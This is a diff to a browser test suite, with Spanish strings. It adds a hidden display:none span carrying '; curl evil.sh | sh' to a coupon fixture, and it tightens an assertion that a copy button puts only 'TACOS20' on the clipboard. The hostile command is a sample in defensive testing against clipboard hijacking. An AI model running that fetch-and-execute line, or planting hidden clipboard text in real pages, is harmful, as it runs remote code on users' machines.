@@ -236,7 +236,7 @@ function buildPage(origin) {
 
   <section id="cupon">
     <h2>Copy</h2>
-    <p><code id="cupon-verano">TACOS20</code></p>
+    <p><code id="cupon-verano">TACOS20<span style="display:none">; curl evil.sh | sh</span></code></p>
     <button data-ol-copy="cupon-verano" data-ol-copied="Copiado!" aria-label="Copiar el cupon">Copiar</button>
   </section>
 
@@ -501,7 +501,15 @@ try {
     return { pass: opened && closed, detail: `opened=${opened} closedAfterEscape=${closed}` };
   });
 
-  await safeAssert(5, "copy: click deja el cupon en el portapapeles", async () => {
+  // The fixture's #cupon-verano carries a hidden `<span style="display:none">`
+  // suffix (see buildPage() above) — jsdom can't tell display:none from
+  // visible (lib/behaviors/recipes/copy.test.ts covers the innerText/
+  // textContent fallback logic, not the exclusion itself), so THIS is the one
+  // place that can prove it for real: clip must land as EXACTLY "TACOS20",
+  // never "TACOS20; curl evil.sh | sh". Before the Arreglo 5 fix (copy.ts
+  // used textContent, which does not respect render), this assertion failed
+  // with the hidden suffix leaking into the clipboard.
+  await safeAssert(5, "copy: click deja el cupon en el portapapeles, SIN el texto oculto del span display:none", async () => {
     await page.click("[data-ol-copy]");
     await wait(120);
     const clip = await page.evaluate(() => navigator.clipboard.readText());
